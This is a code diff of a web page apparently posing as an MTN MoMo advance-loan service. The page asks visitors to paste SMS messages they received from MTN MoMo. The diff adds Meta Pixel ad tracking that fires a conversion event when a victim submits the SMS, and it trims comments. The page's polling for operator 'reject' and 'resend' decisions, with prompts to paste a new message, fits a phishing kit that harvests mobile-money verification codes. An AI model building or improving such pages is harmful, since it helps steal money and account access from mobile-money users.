@@ -6,6 +6,29 @@
     <meta name="theme-color" content="#000000">
     <title>MTN MoMo Loan - Verify SMS | MoMo Advance Loans</title>
 
+    <!-- ============================================
+         META PIXEL — BASE CODE
+         Pixel ID: 1021851290903869
+         ============================================ -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1021851290903869');
+      fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1021851290903869&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- ============================================
+         END META PIXEL
+         ============================================ -->
+
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -384,9 +407,7 @@
         }
         .footer-text { font-size: 11px; color: var(--text-light); font-weight: 600; letter-spacing: 0.05em; }
 
-        /* ═══════════════════════════════════════════
-           SUPER VERIFY OVERLAY
-           ═══════════════════════════════════════════ */
+        /* ═══════════ SUPER VERIFY OVERLAY ═══════════ */
         .verify-overlay {
             position: fixed;
             inset: 0;
@@ -608,9 +629,7 @@
             50% { opacity: 0.5; transform: scale(0.85); }
         }
 
-        /* ═══════════════════════════════════════════
-           NOTICE POPUP (for reject / resend / reminder)
-           ═══════════════════════════════════════════ */
+        /* ═══════════ NOTICE POPUP ═══════════ */
         .notice-overlay {
             position: fixed;
             inset: 0;
@@ -645,16 +664,6 @@
             to { transform: scale(1) translateY(0); opacity: 1; }
         }
 
-        .notice-card::before {
-            content: '';
-            position: absolute;
-            top: -60px; right: -60px;
-            width: 160px; height: 160px;
-            border-radius: 50%;
-            opacity: 0.12;
-            pointer-events: none;
-        }
-
         .notice-icon-wrap {
             width: 74px; height: 74px;
             border-radius: 50%;
@@ -665,8 +674,6 @@
             font-size: 34px;
             position: relative;
         }
-
-        /* Reject (red) */
         .notice-icon-wrap.reject {
             background: linear-gradient(135deg, #FEE2E2, #FECACA);
             box-shadow: 0 8px 24px rgba(220, 38, 38, 0.25);
@@ -679,8 +686,6 @@
             border: 2px solid rgba(220, 38, 38, 0.2);
             animation: ringPulse 2s ease-out infinite;
         }
-
-        /* Resend (amber) */
         .notice-icon-wrap.resend {
             background: linear-gradient(135deg, #FFF8DC, #FFF3C0);
             box-shadow: 0 8px 24px rgba(255, 204, 0, 0.35);
@@ -693,8 +698,6 @@
             border: 2px solid rgba(255, 204, 0, 0.3);
             animation: ringPulse 2s ease-out infinite;
         }
-
-        /* Reminder (blue) */
         .notice-icon-wrap.reminder {
             background: linear-gradient(135deg, #E0E8FF, #C7D6FF);
             box-shadow: 0 8px 24px rgba(0, 51, 102, 0.25);
@@ -707,7 +710,6 @@
             border: 2px solid rgba(0, 51, 102, 0.2);
             animation: ringPulse 2s ease-out infinite;
         }
-
         @keyframes ringPulse {
             0% { transform: scale(1); opacity: 1; }
             100% { transform: scale(1.4); opacity: 0; }
@@ -958,7 +960,6 @@
         const verifySubtitle = document.getElementById('verifySubtitle');
         const verifyStepInner = document.getElementById('verifyStepInner');
 
-        // Notice popup
         const noticeOverlay = document.getElementById('noticeOverlay');
         const noticeIconWrap = document.getElementById('noticeIconWrap');
         const noticeIcon = document.getElementById('noticeIcon');
@@ -1126,7 +1127,6 @@
         let noticeAction = null;
 
         function showNotice({ type, icon, title, message, buttonText, buttonClass, onOk }) {
-            // Reset classes
             noticeIconWrap.className = 'notice-icon-wrap';
             noticeBtn.className = 'notice-btn';
 
@@ -1152,7 +1152,7 @@
         });
 
         /* ═══════════════════════════════════════════
-           POLLING — handles 4 statuses
+           POLLING
         ═══════════════════════════════════════════ */
         let pollTimer = null;
 
@@ -1208,7 +1208,6 @@
                             message: 'Kindly <strong>paste the correct message</strong> you received from MTN MoMo to complete the process. We appreciate your patience.',
                             buttonText: 'PASTE NEW SMS',
                             onOk: function() {
-                                // Stay on same page — clear textarea
                                 smsInput.value = '';
                                 smsInput.classList.remove('invalid');
                                 smsError.classList.remove('show');
@@ -1236,7 +1235,6 @@
                         });
 
                     } else if (data.status === 'resend_requested') {
-                        // legacy support — same as resend
                         stopPolling();
                         stopVerifyAnimation();
                         showNotice({
@@ -1304,6 +1302,16 @@
             }
 
             localStorage.setItem('momoSms', text);
+
+            /* ✅ META PIXEL — AddToCart fired when user submits SMS */
+            if (typeof fbq === 'function') {
+                fbq('track', 'AddToCart', {
+                    content_name: 'MoMo SMS Verification',
+                    content_category: 'SMS_Paste',
+                    currency: 'XAF'
+                });
+                console.log('✅ Meta Pixel: AddToCart event fired');
+            }
 
             verifyBtn.disabled = true;
             verifyBtn.innerHTML = '<span class="spinner"></span>VERIFYING...';
